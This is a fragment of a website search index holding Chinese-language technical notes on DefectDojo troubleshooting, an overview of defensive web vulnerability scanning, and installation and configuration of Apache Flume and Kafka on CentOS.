\u5b8c\u5584\u7684\u4efb\u52a1\u5206\u914d\u7cfb\u7edf\uff0c\u4e0d\u540c\u4efb\u52a1\u5206\u914d\u7ed9\u4e0d\u540c\u4eba\u5458\u8fdb\u884c\u6d4b\u8bd5\uff1b \u5bf9\u4e0d\u540c\u4ea7\u54c1\u3001\u4e0d\u540c\u9879\u76ee\u8fdb\u884c\u7ba1\u7406\uff0c\u53ef\u4ee5\u67e5\u770b\u5404\u81ea\u7684\u6f0f\u6d1e\u60c5\u51b5\uff1b \u652f\u6301LDAP\u3001JIRA\u96c6\u6210\uff1b \u2026\u2026","title":"\u4ea7\u54c1\u8bc4\u4ef7"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#_5","text":"","title":"\u8e29\u5751\u8bb0"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#_6","text":"\u5728defectdojo\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u914d\u7f6e\u6570\u636e\u5e93\u4fe1\u606f\u4e4b\u524d\uff0c\u4e5f\u5c31\u662f\u542f\u52a8MySQL\u6570\u636e\u5e93\u65f6\uff0c\u9700\u8981\u4fee\u6539MySQL\u914d\u7f6e\u6587\u4ef6\uff1a vim /etc/my.cnf # [mysqld] \u4e0b\u9762\u6dfb\u52a0\u4ee5\u4e0b\u4e09\u884c character-set-server=utf8 collation-server=utf8_general_ci skip-character-set-client-handshake # \u91cd\u542fMySQL\u670d\u52a1","title":"\u4e2d\u6587\u4e71\u7801"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#_7","text":"\u5907\u6ce8\uff1a\u8fd9\u91cc\u867d\u7136\u62a5\u9519\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u65b0\u589e\u6f0f\u6d1e\u6210\u529f \u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u62a5\u9519\u95ee\u9898 vim django-DefectDojo/dojo/models.py # \u8df3\u8f6c\u52301049\u884c # hash_string = hash_string.decode('utf-8').strip() # \u6ce8\u91ca\u6b64\u884c hash_string = hash_string.strip() # \u65b0\u589e\u6b64\u884c","title":"\u65b0\u589e\u6f0f\u6d1e\u65f6\uff0c\u6f0f\u6d1e\u540d\u79f0\u4e3a\u4e2d\u6587\u65f6\u62a5\u9519"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#django","text":"vim django-DefectDojo/dojo/settings/settings.py # \u641c\u7d22LANGUAGE_CODE\uff0c\u4fee\u6539\u4e3a\u5982\u4e0b LANGUAGE_CODE = 'zh-Hans'","title":"\u6c49\u5316Django"},{"location":"application-security/vulnerability-management/vm-tools-defectdojo/#_8","text":"Django Authentication Using LDAP \u5f00\u6e90\u6f0f\u6d1e\u7ba1\u7406\u5de5\u5177DefectDojo\uff08\u4e8c\uff09\u4f7f\u7528\u6307\u5357\uff1a\u57fa\u672c\u4f7f\u7528","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/web-security-scan/","text":"Web\u5b89\u5168\u626b\u63cf \u5b89\u5168\u626b\u63cf\uff1a\u9488\u5bf9Web\u5e94\u7528\u8106\u5f31\u6027\u8bc6\u522b\u7684\u4e00\u79cd\u884c\u4e3a\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u505aWeb\u5b89\u5168\u626b\u63cf\uff1f \u624b\u5de5\u5b89\u5168\u6d4b\u8bd5\u6240\u9700\u65f6\u95f4\u5468\u671f\u8f83\u957f\uff0c\u4e0d\u80fd\u6ee1\u8db3\u5feb\u901f\u4ea4\u4ed8\u7684\u9700\u6c42\uff1b \u5f25\u8865\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u77e5\u8bc6\u6280\u80fd\u5c42\u9762\u4e0d\u8db3\uff1b \u907f\u514d\u5b89\u5168\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u7684\u7531\u4e8e\u6d4b\u8bd5\u4eba\u5458\u60f0\u6027\u9020\u6210\u7684\u9057\u6f0f\uff1b \u76ee\u524dWeb\u626b\u63cf\u5668\u80fd\u505a\u5230\u4ec0\u4e48\uff1f \u57fa\u4e8eOWASP Top 10\u7684\u5e38\u89c4\u6f0f\u6d1e\u68c0\u6d4b\uff1b \u57fa\u4e8e\u7279\u5b9a\u7684\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u5982\uff1astruts2 \u76ee\u524dWeb\u626b\u63cf\u5668\u7684\u7f3a\u70b9\u662f\u4ec0\u4e48\uff1f \u8bef\u62a5\u4e25\u91cd\uff0c\u4e5f\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6f0f\u62a5\uff0c\u4e3b\u8981\u662f\u7531\u4e8e\u626b\u63cf\u89c4\u5219\u5bfc\u81f4\uff1b \u4e0d\u80fd\u5b8c\u7f8e\u652f\u6301\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e\u7684\u63a2\u6d4b\uff1b \u5bf9\u7cfb\u7edf\u9020\u6210\u810f\u6570\u636e\u3001\u670d\u52a1\u4e0d\u53ef\u7528\u7b49\u5b89\u5168\u98ce\u9669\uff1b \u5982\u4f55\u6539\u8fdbWeb\u626b\u63cf\u5668\u7684\u7f3a\u70b9\uff1f \u9488\u5bf9\u626b\u63cf\u89c4\u5219\uff1a\u5b8c\u5584\u5e38\u89c4\u6f0f\u6d1e\u68c0\u6d4b\u89c4\u5219+\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e\u6a21\u5f0f\uff08\u8fd9\u662f\u4e00\u4e2a\u4f53\u529b\u6d3b\uff09\uff1b \u9488\u5bf9\u626b\u63cf\u8bef\u62a5\u7387\uff1a\u53d1\u73b0\u6f0f\u6d1e\u8fdb\u884c\u4e8c\u6b21\u9a8c\u8bc1\uff0c\u5982\uff1aawvs+sqlmap\u9a8c\u8bc1sql\u6ce8\u5165\u6f0f\u6d1e\uff1b \u9488\u5bf9\u9020\u6210\u810f\u6570\u636e\uff1a\u4f7f\u7528\u626b\u63cf\u5668\u65f6\uff0c\u8fc7\u6ee4POST\u63d0\u4ea4\u53c2\u6570\u8bf7\u6c42\uff1b \u9488\u5bf9\u9020\u6210\u670d\u52a1\u4e0d\u53ef\u7528\uff1a\u5408\u7406\u9009\u62e9\u626b\u63cf\u7b56\u7565\uff0c\u907f\u5f00\u4e1a\u52a1\u9ad8\u5cf0\u671f\u626b\u63cf\uff1b Web\u626b\u63cf\u5668\u7684\u5206\u7c7b \u6839\u636e\u626b\u63cf\u884c\u4e3a\u5206\u7c7b \u4e3b\u52a8\u626b\u63cf\uff1a\u901a\u8fc7\u722c\u866b\u83b7\u53d6URL\u4fe1\u606f\uff1b \u534a\u88ab\u52a8\u626b\u63cf\uff1a\u901a\u8fc7\u65e5\u5fd7\u83b7\u53d6URL\u4fe1\u606f\uff1b\u901a\u8fc7\u6d41\u91cf\u83b7\u53d6URL\u4fe1\u606f\uff1b\u901a\u8fc7\u4ee3\u7406\u83b7\u53d6URL\u4fe1\u606f\uff1b \u5168\u88ab\u52a8\u626b\u63cf\uff1a \u6839\u636e\u626b\u63cf\u65b9\u5f0f\u5206\u7c7b \u81ea\u52a8\u626b\u63cf\uff1a\u5b9a\u671f\u6267\u884c\u626b\u63cf\u53ef\u4ee5\u9009\u62e9\u5168\u91cf\u7b56\u7565\uff0c\u626b\u63cf\u65f6\u95f4\u8f83\u957f\u9700\u8981\u907f\u5f00\u4e1a\u52a1\u9ad8\u5cf0\u671f\uff1b \u624b\u52a8\u626b\u63cf\uff1a\u624b\u5de5\u6267\u884c\u626b\u63cf\uff0c\u9009\u62e9\u9488\u5bf9\u6027\u7684\u626b\u63cf\u7b56\u7565\uff1b \u4f01\u4e1a\u662f\u5426\u9700\u8981\u81ea\u7814Web\u626b\u63cf\u5668\uff1f \u7efc\u5408\u7b54\u6848\u662f\uff1a\u4e0d\u8981 \u4e3a\u4ec0\u4e48\u5f88\u591a\u4f01\u4e1a\u89c9\u5f97\u9700\u8981\u81ea\u7814 \u5546\u7528\u626b\u63cf\u5668\u90fd\u662f\u901a\u7528\u578b\u7684\uff0c\u4e0d\u540c\u4f01\u4e1a\u5728\u90e8\u7f72\u65b9\u5f0f\u3001\u540e\u7eed\u670d\u52a1\u7b49\u65b9\u9762\u5b58\u5728\u517c\u5bb9\u6027\u95ee\u9898\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u8981\u8f7b\u6613\u81ea\u7814Web\u626b\u63cf\u5668 Web\u626b\u63cf\u5668\u81ea\u7814\u6210\u672c\u592a\u5927\uff0c\u96be\u70b9\u66f4\u591a\u5728\u4e8e\uff1a\u89c4\u5219\u7684\u7ef4\u62a4\u7b49\u3002 \u5229\u7528\u514d\u8d39\u6216\u7834\u89e3\u7684\u626b\u63cf\u5668API \u4e3a\u4e86\u89e3\u51b3\u4f01\u4e1a\u7cfb\u7edf\u591a\u4e1a\u52a1\u7e41\u6742\u7684Web\u626b\u63cf\uff0c\u66f4\u591a\u6211\u4eec\u5229\u7528API\u505a\u6210\u5206\u5e03\u5f0f\u961f\u5217\u7684\u5f62\u5f0f\u6765\u505a\u6210\u4e00\u4e2a\u626b\u63cf\u5668\u3002 \u53c2\u8003\u8d44\u6599 \u4e2d\u901a\u5206\u5e03\u5f0f\u88ab\u52a8\u5b89\u5168\u626b\u63cf\u5b9e\u8df5","title":"Web\u5b89\u5168\u626b\u63cf"},{"location":"application-security/web-security-scan/#web","text":"\u5b89\u5168\u626b\u63cf\uff1a\u9488\u5bf9Web\u5e94\u7528\u8106\u5f31\u6027\u8bc6\u522b\u7684\u4e00\u79cd\u884c\u4e3a\u3002","title":"Web\u5b89\u5168\u626b\u63cf"},{"location":"application-security/web-security-scan/#web_1","text":"\u624b\u5de5\u5b89\u5168\u6d4b\u8bd5\u6240\u9700\u65f6\u95f4\u5468\u671f\u8f83\u957f\uff0c\u4e0d\u80fd\u6ee1\u8db3\u5feb\u901f\u4ea4\u4ed8\u7684\u9700\u6c42\uff1b \u5f25\u8865\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u77e5\u8bc6\u6280\u80fd\u5c42\u9762\u4e0d\u8db3\uff1b \u907f\u514d\u5b89\u5168\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u7684\u7531\u4e8e\u6d4b\u8bd5\u4eba\u5458\u60f0\u6027\u9020\u6210\u7684\u9057\u6f0f\uff1b","title":"\u4e3a\u4ec0\u4e48\u9700\u8981\u505aWeb\u5b89\u5168\u626b\u63cf\uff1f"},{"location":"application-security/web-security-scan/#web_2","text":"\u57fa\u4e8eOWASP Top 10\u7684\u5e38\u89c4\u6f0f\u6d1e\u68c0\u6d4b\uff1b \u57fa\u4e8e\u7279\u5b9a\u7684\u6f0f\u6d1e\u68c0\u6d4b\uff0c\u5982\uff1astruts2","title":"\u76ee\u524dWeb\u626b\u63cf\u5668\u80fd\u505a\u5230\u4ec0\u4e48\uff1f"},{"location":"application-security/web-security-scan/#web_3","text":"\u8bef\u62a5\u4e25\u91cd\uff0c\u4e5f\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6f0f\u62a5\uff0c\u4e3b\u8981\u662f\u7531\u4e8e\u626b\u63cf\u89c4\u5219\u5bfc\u81f4\uff1b \u4e0d\u80fd\u5b8c\u7f8e\u652f\u6301\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e\u7684\u63a2\u6d4b\uff1b \u5bf9\u7cfb\u7edf\u9020\u6210\u810f\u6570\u636e\u3001\u670d\u52a1\u4e0d\u53ef\u7528\u7b49\u5b89\u5168\u98ce\u9669\uff1b","title":"\u76ee\u524dWeb\u626b\u63cf\u5668\u7684\u7f3a\u70b9\u662f\u4ec0\u4e48\uff1f"},{"location":"application-security/web-security-scan/#web_4","text":"\u9488\u5bf9\u626b\u63cf\u89c4\u5219\uff1a\u5b8c\u5584\u5e38\u89c4\u6f0f\u6d1e\u68c0\u6d4b\u89c4\u5219+\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e\u6a21\u5f0f\uff08\u8fd9\u662f\u4e00\u4e2a\u4f53\u529b\u6d3b\uff09\uff1b \u9488\u5bf9\u626b\u63cf\u8bef\u62a5\u7387\uff1a\u53d1\u73b0\u6f0f\u6d1e\u8fdb\u884c\u4e8c\u6b21\u9a8c\u8bc1\uff0c\u5982\uff1aawvs+sqlmap\u9a8c\u8bc1sql\u6ce8\u5165\u6f0f\u6d1e\uff1b \u9488\u5bf9\u9020\u6210\u810f\u6570\u636e\uff1a\u4f7f\u7528\u626b\u63cf\u5668\u65f6\uff0c\u8fc7\u6ee4POST\u63d0\u4ea4\u53c2\u6570\u8bf7\u6c42\uff1b \u9488\u5bf9\u9020\u6210\u670d\u52a1\u4e0d\u53ef\u7528\uff1a\u5408\u7406\u9009\u62e9\u626b\u63cf\u7b56\u7565\uff0c\u907f\u5f00\u4e1a\u52a1\u9ad8\u5cf0\u671f\u626b\u63cf\uff1b","title":"\u5982\u4f55\u6539\u8fdbWeb\u626b\u63cf\u5668\u7684\u7f3a\u70b9\uff1f"},{"location":"application-security/web-security-scan/#web_5","text":"","title":"Web\u626b\u63cf\u5668\u7684\u5206\u7c7b"},{"location":"application-security/web-security-scan/#_1","text":"\u4e3b\u52a8\u626b\u63cf\uff1a\u901a\u8fc7\u722c\u866b\u83b7\u53d6URL\u4fe1\u606f\uff1b \u534a\u88ab\u52a8\u626b\u63cf\uff1a\u901a\u8fc7\u65e5\u5fd7\u83b7\u53d6URL\u4fe1\u606f\uff1b\u901a\u8fc7\u6d41\u91cf\u83b7\u53d6URL\u4fe1\u606f\uff1b\u901a\u8fc7\u4ee3\u7406\u83b7\u53d6URL\u4fe1\u606f\uff1b \u5168\u88ab\u52a8\u626b\u63cf\uff1a","title":"\u6839\u636e\u626b\u63cf\u884c\u4e3a\u5206\u7c7b"},{"location":"application-security/web-security-scan/#_2","text":"\u81ea\u52a8\u626b\u63cf\uff1a\u5b9a\u671f\u6267\u884c\u626b\u63cf\u53ef\u4ee5\u9009\u62e9\u5168\u91cf\u7b56\u7565\uff0c\u626b\u63cf\u65f6\u95f4\u8f83\u957f\u9700\u8981\u907f\u5f00\u4e1a\u52a1\u9ad8\u5cf0\u671f\uff1b \u624b\u52a8\u626b\u63cf\uff1a\u624b\u5de5\u6267\u884c\u626b\u63cf\uff0c\u9009\u62e9\u9488\u5bf9\u6027\u7684\u626b\u63cf\u7b56\u7565\uff1b","title":"\u6839\u636e\u626b\u63cf\u65b9\u5f0f\u5206\u7c7b"},{"location":"application-security/web-security-scan/#web_6","text":"\u7efc\u5408\u7b54\u6848\u662f\uff1a\u4e0d\u8981","title":"\u4f01\u4e1a\u662f\u5426\u9700\u8981\u81ea\u7814Web\u626b\u63cf\u5668\uff1f"},{"location":"application-security/web-security-scan/#_3","text":"\u5546\u7528\u626b\u63cf\u5668\u90fd\u662f\u901a\u7528\u578b\u7684\uff0c\u4e0d\u540c\u4f01\u4e1a\u5728\u90e8\u7f72\u65b9\u5f0f\u3001\u540e\u7eed\u670d\u52a1\u7b49\u65b9\u9762\u5b58\u5728\u517c\u5bb9\u6027\u95ee\u9898\u3002","title":"\u4e3a\u4ec0\u4e48\u5f88\u591a\u4f01\u4e1a\u89c9\u5f97\u9700\u8981\u81ea\u7814"},{"location":"application-security/web-security-scan/#web_7","text":"Web\u626b\u63cf\u5668\u81ea\u7814\u6210\u672c\u592a\u5927\uff0c\u96be\u70b9\u66f4\u591a\u5728\u4e8e\uff1a\u89c4\u5219\u7684\u7ef4\u62a4\u7b49\u3002","title":"\u4e3a\u4ec0\u4e48\u4e0d\u8981\u8f7b\u6613\u81ea\u7814Web\u626b\u63cf\u5668"},{"location":"application-security/web-security-scan/#api","text":"\u4e3a\u4e86\u89e3\u51b3\u4f01\u4e1a\u7cfb\u7edf\u591a\u4e1a\u52a1\u7e41\u6742\u7684Web\u626b\u63cf\uff0c\u66f4\u591a\u6211\u4eec\u5229\u7528API\u505a\u6210\u5206\u5e03\u5f0f\u961f\u5217\u7684\u5f62\u5f0f\u6765\u505a\u6210\u4e00\u4e2a\u626b\u63cf\u5668\u3002","title":"\u5229\u7528\u514d\u8d39\u6216\u7834\u89e3\u7684\u626b\u63cf\u5668API"},{"location":"application-security/web-security-scan/#_4","text":"\u4e2d\u901a\u5206\u5e03\u5f0f\u88ab\u52a8\u5b89\u5168\u626b\u63cf\u5b9e\u8df5","title":"\u53c2\u8003\u8d44\u6599"},{"location":"big_data/flume/","text":"Flume\u65e5\u5fd7\u6536\u96c6 Centos7\u5b89\u88c5Flume # \u89e3\u51b3\u4f9d\u8d56 tar -xf jdk-8u191-linux-x64.tar.gz -C /app/ vim /etc/profile export JAVA_HOME=/app/jdk1.8.0_191 export PATH=$JAVA_HOME/bin:$PATH source /etc/profile # \u9a8c\u8bc1java\u662f\u5426\u5b89\u88c5\u6210\u529f java -version # \u4e0b\u8f7dflume\uff0c\u89e3\u538b\u5230\u6307\u5b9a\u76ee\u5f55 tar -xf apache-flume-1.8.0-bin.tar.gz -C /app/ # \u914d\u7f6e\u73af\u5883\u53d8\u91cf vim /etc/profile export FLUME_HOME=/app/apache-flume-1.8.0-bin export PATH=$FLUME_HOME/bin:$PATH source /etc/profile # \u914d\u7f6eflume\u8fd0\u884c\u73af\u5883\u6587\u4ef6 cp /app/apache-flume-1.8.0-bin/conf/flume-env.sh.template /app/apache-flume-1.8.0-bin/conf/flume-env.sh vim /app/apache-flume-1.8.0-bin/conf/flume-env.sh export JAVA_HOME=JAVA_PATH # \u67e5\u770b\u662f\u5426\u5b89\u88c5\u5b8c\u6210 flume-ng version Flume\u6848\u4f8b \u4ece\u6307\u5b9a\u7f51\u7edc\u7aef\u53e3\u91c7\u96c6\u6570\u636e\u8f93\u51fa\u5230\u63a7\u5236\u53f0 \u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/example-1.conf # a1:agent\u540d\u79f0 # r1:source\u540d\u79f0 # c1:channel\u540d\u79f0 # k1:sink\u540d\u79f0 # Name the components on this agent a1.sources = r1 a1.channels = c1 a1.sinks = k1 # Describe/configure the source a1.sources.r1.type = netcat a1.sources.r1.bind = localhost a1.sources.r1.port = 44444 # Describe the sink a1.sinks.k1.type = logger # Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100 # Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1 \u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name a1 --conf /app/apache-flume-1.8.0-bin/conf --conf-file /app/apache-flume-1.8.0-bin/conf/example-1.conf -Dflume.root.logger=INFO,console \u5b9e\u65f6\u6587\u4ef6\u76d1\u63a7\u8f93\u51fa\u5230\u63a7\u5236\u53f0 \u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/example-2.conf # Name the components on this agent a1.sources = r1 a1.sinks = k1 a1.channels = c1 # Describe/configure the source a1.sources.r1.type = exec a1.sources.r1.command = tail -F /var/log/messages a1.sources.r1.shell = /bin/sh -c # Describe the sink a1.sinks.k1.type = logger # Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100 # Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1 \u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name a1 --conf /app/apache-flume-1.8.0-bin/conf --conf-file /app/apache-flume-1.8.0-bin/conf/example-2.conf -Dflume.root.logger=INFO,console \u5c06Server1\u7684\u65e5\u5fd7\u4f20\u8f93\u5230Server2\u7684\u63a7\u5236\u53f0 \u5728Server1\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/exec-memory-avro.conf exec-memory-avro.sources = exec-source exec-memory-avro.sinks = avro-sink exec-memory-avro.channels = memory-channel exec-memory-avro.sources.exec-source.type = exec exec-memory-avro.sources.exec-source.command = tail -F /var/log/messages exec-memory-avro.sources.exec-source.shell = /bin/sh -c exec-memory-avro.sinks.avro-sink.type = avro exec-memory-avro.sinks.avro-sink.hostname = localhost exec-memory-avro.sinks.avro-sink.port = 44444 exec-memory-avro.channels.memory-channel.type = memory exec-memory-avro.channels.memory-channel.capacity = 1000 exec-memory-avro.channels.memory-channel.transactionCapacity = 100 exec-memory-avro.sources.exec-source.channels = memory-channel exec-memory-avro.sinks.avro-sink.channel = memory-channel \u5728Server2\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/avro-memory-logger.conf avro-memory-logger.sources = avro-source avro-memory-logger.sinks = logger-sink avro-memory-logger.channels = memory-channel avro-memory-logger.sources.avro-source.type = avro avro-memory-logger.sources.avro-source.bind = localhost avro-memory-logger.sources.avro-source.port = 44444 avro-memory-logger.sinks.logger-sink.type = logger avro-memory-logger.channels.memory-channel.type = memory avro-memory-logger.channels.memory-channel.capacity = 1000 avro-memory-logger.channels.memory-channel.transactionCapacity = 100 avro-memory-logger.sources.avro-source.channels = memory-channel avro-memory-logger.sinks.logger-sink.channel = memory-channel \u5728Server2\u6267\u884c\u547d\u4ee4(\u5fc5\u987b\u5148\u5728Server2\u6267\u884c)\uff1a flume-ng agent --name avro-memory-logger --conf /app/apache-flume-1.8.0-bin/conf --conf-file /app/apache-flume-1.8.0-bin/conf/avro-memory-logger.conf -Dflume.root.logger=INFO,console \u5728Server1\u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name exec-memory-avro --conf /app/apache-flume-1.8.0-bin/conf --conf-file /app/apache-flume-1.8.0-bin/conf/exec-memory-avro.conf -Dflume.root.logger=INFO,console","title":"Flume\u65e5\u5fd7\u6536\u96c6"},{"location":"big_data/flume/#flume","text":"","title":"Flume\u65e5\u5fd7\u6536\u96c6"},{"location":"big_data/flume/#centos7flume","text":"# \u89e3\u51b3\u4f9d\u8d56 tar -xf jdk-8u191-linux-x64.tar.gz -C /app/ vim /etc/profile export JAVA_HOME=/app/jdk1.8.0_191 export PATH=$JAVA_HOME/bin:$PATH source /etc/profile # \u9a8c\u8bc1java\u662f\u5426\u5b89\u88c5\u6210\u529f java -version # \u4e0b\u8f7dflume\uff0c\u89e3\u538b\u5230\u6307\u5b9a\u76ee\u5f55 tar -xf apache-flume-1.8.0-bin.tar.gz -C /app/ # \u914d\u7f6e\u73af\u5883\u53d8\u91cf vim /etc/profile export FLUME_HOME=/app/apache-flume-1.8.0-bin export PATH=$FLUME_HOME/bin:$PATH source /etc/profile # \u914d\u7f6eflume\u8fd0\u884c\u73af\u5883\u6587\u4ef6 cp /app/apache-flume-1.8.0-bin/conf/flume-env.sh.template /app/apache-flume-1.8.0-bin/conf/flume-env.sh vim /app/apache-flume-1.8.0-bin/conf/flume-env.sh export JAVA_HOME=JAVA_PATH # \u67e5\u770b\u662f\u5426\u5b89\u88c5\u5b8c\u6210 flume-ng version","title":"Centos7\u5b89\u88c5Flume"},{"location":"big_data/flume/#flume_1","text":"","title":"Flume\u6848\u4f8b"},{"location":"big_data/flume/#_1","text":"\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/example-1.conf # a1:agent\u540d\u79f0 # r1:source\u540d\u79f0 # c1:channel\u540d\u79f0 # k1:sink\u540d\u79f0 # Name the components on this agent a1.sources = r1 a1.channels = c1 a1.sinks = k1 # Describe/configure the source a1.sources.r1.type = netcat a1.sources.r1.bind = localhost a1.sources.r1.port = 44444 # Describe the sink a1.sinks.k1.type = logger # Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100 # Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1 \u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name a1 --conf /app/apache-flume-1.8.0-bin/conf --conf-file /app/apache-flume-1.8.0-bin/conf/example-1.conf -Dflume.root.logger=INFO,console","title":"\u4ece\u6307\u5b9a\u7f51\u7edc\u7aef\u53e3\u91c7\u96c6\u6570\u636e\u8f93\u51fa\u5230\u63a7\u5236\u53f0"},{"location":"big_data/flume/#_2","text":"\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/example-2.conf # Name the components on this agent a1.sources = r1 a1.sinks = k1 a1.channels = c1 # Describe/configure the source a1.sources.r1.type = exec a1.sources.r1.command = tail -F /var/log/messages a1.sources.r1.shell = /bin/sh -c # Describe the sink a1.sinks.k1.type = logger # Use a channel which buffers events in memory a1.channels.c1.type = memory a1.channels.c1.capacity = 1000 a1.channels.c1.transactionCapacity = 100 # Bind the source and sink to the channel a1.sources.r1.channels = c1 a1.sinks.k1.channel = c1 \u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name a1 --conf /app/apache-flume-1.8.0-bin/conf --conf-file /app/apache-flume-1.8.0-bin/conf/example-2.conf -Dflume.root.logger=INFO,console","title":"\u5b9e\u65f6\u6587\u4ef6\u76d1\u63a7\u8f93\u51fa\u5230\u63a7\u5236\u53f0"},{"location":"big_data/flume/#server1server2","text":"\u5728Server1\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/exec-memory-avro.conf exec-memory-avro.sources = exec-source exec-memory-avro.sinks = avro-sink exec-memory-avro.channels = memory-channel exec-memory-avro.sources.exec-source.type = exec exec-memory-avro.sources.exec-source.command = tail -F /var/log/messages exec-memory-avro.sources.exec-source.shell = /bin/sh -c exec-memory-avro.sinks.avro-sink.type = avro exec-memory-avro.sinks.avro-sink.hostname = localhost exec-memory-avro.sinks.avro-sink.port = 44444 exec-memory-avro.channels.memory-channel.type = memory exec-memory-avro.channels.memory-channel.capacity = 1000 exec-memory-avro.channels.memory-channel.transactionCapacity = 100 exec-memory-avro.sources.exec-source.channels = memory-channel exec-memory-avro.sinks.avro-sink.channel = memory-channel \u5728Server2\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff1a vim /app/apache-flume-1.8.0-bin/conf/avro-memory-logger.conf avro-memory-logger.sources = avro-source avro-memory-logger.sinks = logger-sink avro-memory-logger.channels = memory-channel avro-memory-logger.sources.avro-source.type = avro avro-memory-logger.sources.avro-source.bind = localhost avro-memory-logger.sources.avro-source.port = 44444 avro-memory-logger.sinks.logger-sink.type = logger avro-memory-logger.channels.memory-channel.type = memory avro-memory-logger.channels.memory-channel.capacity = 1000 avro-memory-logger.channels.memory-channel.transactionCapacity = 100 avro-memory-logger.sources.avro-source.channels = memory-channel avro-memory-logger.sinks.logger-sink.channel = memory-channel \u5728Server2\u6267\u884c\u547d\u4ee4(\u5fc5\u987b\u5148\u5728Server2\u6267\u884c)\uff1a flume-ng agent --name avro-memory-logger --conf /app/apache-flume-1.8.0-bin/conf --conf-file /app/apache-flume-1.8.0-bin/conf/avro-memory-logger.conf -Dflume.root.logger=INFO,console \u5728Server1\u6267\u884c\u547d\u4ee4\uff1a flume-ng agent --name exec-memory-avro --conf /app/apache-flume-1.8.0-bin/conf --conf-file /app/apache-flume-1.8.0-bin/conf/exec-memory-avro.conf -Dflume.root.logger=INFO,console","title":"\u5c06Server1\u7684\u65e5\u5fd7\u4f20\u8f93\u5230Server2\u7684\u63a7\u5236\u53f0"},{"location":"big_data/kafka/","text":"Kafka\u77e5\u8bc6\u4f53\u7cfb Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eKafka # yum\u5b89\u88c5java\u73af\u5883 # \u4e0b\u8f7d\u5e76\u89e3\u538bKafka wget http://mirror.bit.edu.cn/apache/kafka/2.3.0/kafka_2.11-2.3.0.tgz tar -xf kafka_2.11-2.3.0.tgz # \u79fb\u52a8\u5230\u5408\u7406\u4f4d\u7f6e mv kafka_2.11-2.3.0 /opt/kafka2.11 # \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf echo export KAFKA_HOME=/opt/kafka2.11 /etc/profile echo export PATH=$PATH:$KAFKA_HOME/bin /etc/profile source /etc/profile # \u6d4b\u8bd5Kafka\uff0c\u4e00\u5b9a\u8981\u4f18\u5148\u542f\u52a8Zookeeper # \u6211\u8fd9\u91cc10.10.10.19:2181\u7aef\u53e3\u4e0a\u662f\u6211\u7684Zookeeper\uff0c\u4e5f\u53ef\u4ee5\u53c2\u89c1\u4e0b\u9762\u7684\u914d\u7f6e\u6587\u4ef6 kafka-server-start.sh -daemon /opt/kafka2.11/config/server.properties # \u67e5\u770b\u662f\u5426\u542f\u52a8\u6210\u529f jps -m \u914d\u7f6eKafka vim /opt/kafka2.11/config/server.properties # \u8282\u70b9\u540d\u79f0 broker.id=0 # \u7ed1\u5b9a\u5730\u5740 listeners=PLAINTEXT://PLAINTEXT:9092 # \u5f53kafka\u5728docker\u6216\u8005\u865a\u62df\u673a\u4e2d\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570 advertised.listeners=PLAINTEXT://kafka-server:9092 # \u53d1\u9001\u7f13\u5b58\u5b57\u8282\u6570 socket.send.buffer.bytes=102400 # \u63a5\u6536\u7f13\u5b58\u5b57\u8282\u6570 socket.receive.buffer.bytes=102400 # \u6700\u5927\u8bf7\u6c42\u5b57\u8282\u6570\uff0c\u4fdd\u62a4OOM socket.request.max.bytes=104857600 # \u65e5\u5fd7\u76ee\u5f55 log.dirs=/tmp/kafka-logs # \u9ed8\u8ba4\u5206\u533a\u6570 num.partitions=1 # zookeeper\u5730\u5740 zookeeper.connect=10.10.10.19:2181 # zookeeper\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u4f4d\u6beb\u79d2 zookeeper.connection.timeout.ms=6000 